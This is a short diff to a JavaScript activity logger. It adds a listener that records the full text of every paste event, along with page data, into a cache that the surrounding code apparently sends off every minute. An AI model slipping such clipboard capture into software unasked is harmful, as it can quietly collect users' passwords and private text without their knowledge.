@@ -113,6 +113,20 @@ document.addEventListener('copy', function(e) {
     console.log(event_cache.slice(-1)[0]);
 });
 
+// Log paste events
+document.addEventListener('paste', function(e) {
+    const pastedText = (event.clipboardData || window.clipboardData).getData('text');
+    
+    event_cache.push({
+        timestamp: new Date().getTime(),
+        event_type: 'paste',
+        pasted_text: pastedText,
+        page_data: page_data
+    });
+
+    console.log(event_cache.slice(-1)[0]);
+});
+
 // Auto-send logs every minute (only if there are new logs)
 let last_sent_count = 0;
 setInterval(function() {
